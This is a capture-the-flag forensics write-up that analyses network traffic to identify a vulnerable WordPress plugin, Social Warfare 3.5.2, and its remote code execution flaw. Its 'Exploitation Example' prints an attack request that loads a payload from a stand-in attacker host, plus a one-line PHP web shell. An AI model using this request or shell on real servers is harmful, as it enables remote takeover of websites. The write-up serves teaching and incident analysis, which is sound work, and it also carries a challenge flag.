# KnightCTF 2026 - Forensics: Vulnerability Exploitation

## Challenge Information
- **Category:** Forensics
- **File:** pcap2.pcapng

## Challenge Description
Using the same pcap file (pcap2.pcapng), find the vulnerable plugin name and version.

**Flag Format:** `KCTF{plugin_name_version}`

---

## Solution

### Step 1: Identify Plugin Scanning Activity
The attacker (192.168.1.104) was scanning for WordPress plugins. Searching for plugin readme.txt requests:

```bash
strings pcap2.pcapng | grep -i 'readme.txt' | sort -u
```

Found targeted plugin scans:
```
HEAD /wordpress/wp-content/plugins/social-warfare/readme.txt HTTP/1.1
GET /wordpress/wp-content/plugins/social-warfare/readme.txt HTTP/1.1
HEAD /wordpress/wp-content/plugins/thim-blocks/readme.txt HTTP/1.1
GET /wordpress/wp-content/plugins/thim-blocks/readme.txt HTTP/1.1
```

### Step 2: Extract Plugin Information
Exported HTTP objects from the pcap:

```bash
tshark -r pcap2.pcapng -Y 'http' --export-objects 'http,/tmp/http_export'
```

### Step 3: Analyze readme.txt Content
Read the exported readme.txt file to find plugin details:

```bash
cat /tmp/http_export/readme.txt
```

Content revealed:
```
=== WordPress Social Sharing Plugin - Social Warfare ===
Contributors: holas84, dustinwstout, webinator, warfareplugins...
Tags: sharing buttons, social media share, floating share buttons...
Requires at least: 4.5.0
Tested up to: 5.1
Stable tag: 3.5.2
Requires PHP: 5.6
```

### Step 4: Vulnerability Identification
**Social Warfare version 3.5.2** is vulnerable to **CVE-2019-9978** - an **Unauthenticated Remote Code Execution (RCE)** vulnerability.

This vulnerability allows attackers to inject malicious payloads via the `swp_url` parameter, leading to arbitrary code execution on the server.

**Affected Versions:** < 3.5.3

---

## Flag
```
KCTF{social_warfare_3.5.2}
```

---

## Vulnerability Details

### CVE-2019-9978 - Social Warfare RCE

| Attribute | Value |
|-----------|-------|
| Plugin | Social Warfare |
| Vulnerable Version | 3.5.2 (and below) |
| CVE | CVE-2019-9978 |
| Type | Unauthenticated RCE |
| CVSS Score | 9.8 (Critical) |

### How the Attack Works
1. Attacker scans for Social Warfare plugin presence via `readme.txt`
2. Plugin confirmed with version 3.5.2 (vulnerable)
3. Exploit uses `swp_url` parameter to load malicious payload
4. Payload executes arbitrary PHP code on the server

### Exploitation Example
```
GET /wordpress/?swp_url=http://attacker.com/payload.txt
```

Where `payload.txt` contains:
```php
<pre>system($_GET['cmd'])</pre>
```

---

## Attack Timeline from PCAP
1. **Directory Bruteforce** - Attacker scanned thousands of paths
2. **Plugin Enumeration** - Checked for various vulnerable plugins
3. **timthumb Scanning** - Searched for timthumb.php vulnerabilities
4. **Social Warfare Discovery** - Found and identified vulnerable plugin
5. **User Enumeration** - Used wp-json API to find admin user
6. **Login Attempt** - Tried credentials against wp-login.php

---

## Tools Used
- tshark (HTTP object export)
- strings
- grep
- Wireshark

---

## References
- [CVE-2019-9978 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-9978)
- [Social Warfare RCE Analysis](https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/)

---

**Author:** MR. Umair   
**Date:** January 20, 2026  
**Competition:** KnightCTF 2026